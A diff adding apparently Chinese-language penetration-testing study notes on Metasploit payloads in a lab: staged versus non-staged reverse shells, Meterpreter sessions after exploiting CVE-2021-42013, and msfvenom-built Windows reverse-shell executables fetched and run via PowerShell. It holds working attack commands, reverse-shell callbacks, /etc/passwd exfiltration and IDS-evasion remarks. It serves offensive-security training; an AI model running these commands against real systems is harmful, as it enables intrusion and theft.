@@ -1519,3 +1519,362 @@ msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 1
 ```
 
 ## Using Metasploit Payloads
+了解 Staged 與 Non-Staged Payloads 的區別、 Metasploit 提供的 [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html) Payload 以及如何產生可執行檔形式的 Payload
+### Staged vs Non-Staged Payloads
+當發現一個漏洞（例如 Buffer Overflow）時，通常會需要利用 Shellcode 來執行惡意程式碼。但有些漏洞的緩衝區大小有限，如果我們的 Payload 太大，將無法成功利用漏洞。在這種情況下，我們需要選擇合適的 Payload 來確保攻擊成功。\
+Metasploit 提供兩種主要的 Payload 類型：\
+1. Non-Staged Payload（單段式）：完整的 Payload 會 一次性傳送到目標系統，然後直接執行
+    - 優點：結構簡單、執行速度快、不需要額外下載內容。
+    - 缺點：Payload 較大，如果漏洞有空間限制，可能無法利用。
+2. Staged Payload（分段式）：Payload 會 分成兩個階段，第一階段是一個小型載入器 (Stub)，負責從攻擊者那裡下載完整的 Main Payload 再執行
+    - 優點：適合漏洞空間有限的情境（如 Buffer Overflow）。較不易被防毒軟體偵測（因為主要程式碼不是直接送過去）。
+    - 缺點：需要攻擊者 保持與目標機器的連線，否則第二階段無法下載。
+#### 1. 在 Metasploit 中選擇 Payload
+使用 `show payloads` 來查看目前 Exploit 模組支援的 Payload
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
+Compatible Payloads
+===================
+
+   #   Name                                              Disclosure Date  Rank    Check  Description
+   -   ----                                              ---------------  ----    -----  -----------
+...
+   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
+...
+   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
+...
+```
+> Index 15：payload/linux/x64/shell/reverse_tcp（`Staged`）\
+Index 20：payload/linux/x64/shell_reverse_tcp（`Non-Staged`）
+
+>[!Tip]
+>**如何區分 Staged 與 Non-Staged？**\
+在 Metasploit 中：\
+Staged Payload 通常會有 /（如 shell/reverse_tcp）\
+Non-Staged Payload 沒有 /（如 shell_reverse_tcp）
+
+#### 2. 使用 Staged Payload 來獲取 Reverse Shell
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 15
+msf6 exploit(multi/http/apache_normalize_path_rce) > run
+
+[*] Started reverse TCP handler on 192.168.119.4:4444 
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
+[*] http://192.168.50.16:80 - Sending linux/x64/shell/reverse_tcp command payload
+[*] Sending stage (38 bytes) to 192.168.50.16
+[!] Tried to delete /tmp/EqDPZD, unknown result
+[*] Command shell session 3 opened (192.168.119.4:4444 -> 192.168.50.16:35536) at 2022-08-08 05:18:36 -0400
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+```
+> 第一階段（Stub） 只佔用 38 bytes，非常適合用於空間受限的漏洞。\
+ 第二階段成功獲得 reverse shell。
+ 
+### Meterpreter Payload
+[Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html) 是 Metasploit 中的一種 進階 Payload，提供了比普通反向 Shell 更強大的功能，例如：
+- 隱藏執行（Fileless）：不會在硬碟上建立檔案，只運行在記憶體中。
+- 加密通信：預設使用 AES 加密，避免被網路監測偵測到。
+- 支援多種操作系統：包括 Windows、Linux、macOS、Android。
+- 可動態擴充：允許載入額外模組來增加功能。
+
+#### 1. 在 Metasploit 中選擇 Payload
+選擇 64 位元 Non-Staged 版本
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                              Disclosure Date  Rank    Check  Description
+   -   ----                                              ---------------  ----    -----  -----------
+   ...
+   7   payload/linux/x64/meterpreter/bind_tcp                             normal  No     Linux Mettle x64, Bind TCP Stager
+   8   payload/linux/x64/meterpreter/reverse_tcp                          normal  No     Linux Mettle x64, Reverse TCP Stager
+   9   payload/linux/x64/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
+   10  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
+   11  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
+   ...
+   
+msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 11
+payload => linux/x64/meterpreter_reverse_http
+msf6 exploit(multi/http/apache_normalize_path_rce) > show options
+
+Module options (exploit/multi/http/apache_normalize_path_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013)
+   DEPTH      5                yes       Depth for Path Traversal
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.226.16   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasplo
+                                         it/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cgi-bin         yes       Base path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (linux/x64/meterpreter_reverse_http):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.45.230   yes       The local listener hostname
+   LPORT  8080             yes       The local listener port
+   LURI                    no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Dropper)
+
+```
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.185.16
+msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.45.216
+```
+#### 2. 執行 Exploit 並獲取 Meterpreter Session
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > run
+
+[*] Started HTTP reverse handler on http://192.168.45.216:8080
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.185.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] http://192.168.185.16:80 - Attempt to exploit for CVE-2021-42013
+[*] http://192.168.185.16:80 - Sending linux/x64/meterpreter_reverse_http command payload
+[*] http://192.168.45.216:8080 handling request from 192.168.185.16; (UUID: gcm5w7bn) Redirecting stageless connection from /_aaoZ81_WAal7qPswiRDPwgp_vzErEAmbUGaUBpuLDeN58H with UA 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
+[*] http://192.168.45.216:8080 handling request from 192.168.185.16; (UUID: gcm5w7bn) Attaching orphaned/stageless session...
+[*] Meterpreter session 1 opened (192.168.45.216:8080 -> 192.168.185.16:57718) at 2025-03-07 07:30:13 -0500
+[!] This exploit may require manual cleanup of '/tmp/LYTRDRdG' on the target
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    ...
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    ...
+    info                      Displays information about a Post module
+    ...
+    load                      Load one or more meterpreter extensions
+    ...
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    ...
+
+...
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+```
+#### 3. Meterpreter 內建指令
+![image](https://hackmd.io/_uploads/BkSSDwdjyg.png)
+收集系統資訊與當前使用者
+```
+meterpreter > sysinfo
+Computer     : 172.29.0.2
+OS           : Ubuntu 20.04 (Linux 5.4.0-137-generic)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+meterpreter > getuid
+Server username: daemon
+```
+#### 4. 透過 Meterpreter 控制 Target Machine
+```
+meterpreter > shell
+Process 149 created.
+Channel 1 created.
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+##### - 下載檔案
+```
+meterpreter > lpwd
+/home/chw
+meterpreter > lcd /home/chw/Downloads
+meterpreter > lpwd
+/home/chw/Downloads
+meterpreter > download /etc/passwd
+[*] Downloading: /etc/passwd -> /home/chw/Downloads/passwd
+[*] Downloaded 926.00 B of 926.00 B (100.0%): /etc/passwd -> /home/chw/Downloads/passwd
+[*] Completed  : /etc/passwd -> /home/chw/Downloads/passwd
+meterpreter > lcat /home/kali/Downloads/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+> 成功將/etc/passwd下載到本機
+
+##### - 上傳檔案
+上傳執行 [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check) 來尋找潛在的提權方式
+```
+meterpreter > upload /usr/bin/unix-privesc-check /tmp/
+[*] Uploading  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
+[*] Completed  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
+meterpreter > ls /tmp
+Listing: /tmp
+=============
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+100755/rwxr-xr-x  1068952  fil   2025-03-07 07:26:44 -0500  IBscb
+100755/rwxr-xr-x  1068952  fil   2025-03-07 07:30:08 -0500  LYTRDRdG
+100644/rw-r--r--  36801    fil   2025-03-07 07:43:32 -0500  unix-privesc-check
+```
+
+#### - 使用 HTTPS Meterpreter
+HTTPS Payload 使用 SSL/TLS 加密通信，使得 入侵檢測系統（IDS）難以發現惡意活動。
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/meterpreter_reverse_https
+msf6 exploit(multi/http/apache_normalize_path_rce) > show options
+msf6 exploit(multi/http/apache_normalize_path_rce) > run
+
+```
+### Executable Payloads
+Metasploit 的 [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) 工具如何使用它來產生可執行的惡意 Payload file
+
+>[!Note]
+>msfvenom 是 Metasploit 提供的獨立 Payload 產生工具，用來建立 惡意執行檔 或 腳本 payload，可用於：
+>- Windows 可執行檔（.exe）
+>- Linux 執行檔（.elf）
+>- Webshell（PHP、ASP、JSP 等）
+>- PowerShell / Python / Bash 腳本
+>- Shellcode、DLL、Mach-O（macOS 可執行檔）等
+
+#### 1. 建立惡意的 Windows binary
+列出所有相關 payloads
+```
+┌──(chw㉿CHW)-[~]
+└─$ msfvenom -l payloads --platform windows --arch x64 
+
+...
+windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
+...
+windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a command shell (Windows x64)
+...
+```
+> Non-Staged Payload 與 Staged Payload
+
+#### 2. 使用 Non-Staged Payload 產生 Windows 執行檔
+產生一個 Windows x64 可執行檔（.exe），內嵌一個 Non-Staged 反向 Shell Payload
+```
+┌──(chw㉿CHW)-[~]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.216 LPORT=443 -f exe -o nonstaged.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: nonstaged.exe
+┌──(chw㉿CHW)-[~]
+└─$ python3 -m http.server 80     
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+>`-p windows/x64/shell_reverse_tcp`: 指定 Windows 64 位元的 Non-Staged 反向 Shell Payload\
+`LHOST =192.168.45.216`: 設定 Kali 地址（用於接收反向連線）\
+`LPORT=443`: 設定監聽 port（目標機器會連回此端口）\
+`-f exe`: 產生的 Payload 以 Windows 執行檔（.exe）格式輸出\
+`-o nonstaged.exe`: 輸出為 nonstaged.exe（生成的惡意執行檔）
+
+#### 3. 登入 Windows RDP 下載並執行惡意執行檔
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:justin /p:SuperS3cure1337# /v:192.168.185.202
+```
+(Powershell)
+```
+PS C:\Users\justin> iwr -uri http://192.168.45.216/nonstaged.exe -Outfile nonstaged.exe
+PS C:\Users\justin> .\nonstaged.exe
+```
+(Kali)
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 443
+listening on [any] 443 ...
+connect to [192.168.45.216] from (UNKNOWN) [192.168.185.202] 56305
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\justin>
+```
+
+#### - 使用 Staged Payload 產生 Windows 執行檔
+與 2. 一樣的步驟
+```
+┌──(chw㉿CHW)-[~]
+└─$ msfvenom -p msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.216  LPORT=443 -f exe -o staged.exe
+┌──(chw㉿CHW)-[~]
+└─$ python3 -m http.server 80
+```
+#### - 用 Metasploit multi/handler 來接收 reverse shell
+(Powershell)
+```
+PS C:\Users\justin> iwr -uri http://192.168.45.216/staged.exe -Outfile staged.exe
+PS C:\Users\justin> .\staged.exe
+```
+(Metasploit)
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > use multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
+msf6 exploit(multi/handler) > show options
+...
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+...
+msf6 exploit(multi/handler) > set LHOST 192.168.45.216
+msf6 exploit(multi/handler) > set LPORT 443
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.45.216:443 
+[*] Sending stage (336 bytes) to 192.168.185.202
+[*] Command shell session 2 opened (192.168.45.216:443 -> 192.168.185.202:56329) at 2025-03-07 08:13:25 -0500
+
+
+Shell Banner:
+Microsoft Windows [Version 10.0.20348.169]
+-----
+          
+
+C:\Users\justin>
+
+```
+## Performing Post-Exploitation with Metasploit
+Metasploit 的後滲透（Post-Exploitation）功能，即 成功入侵目標機器後，如何利用已獲得的存取權限進行進一步的攻擊
+### Core Meterpreter Post-Exploitation Features
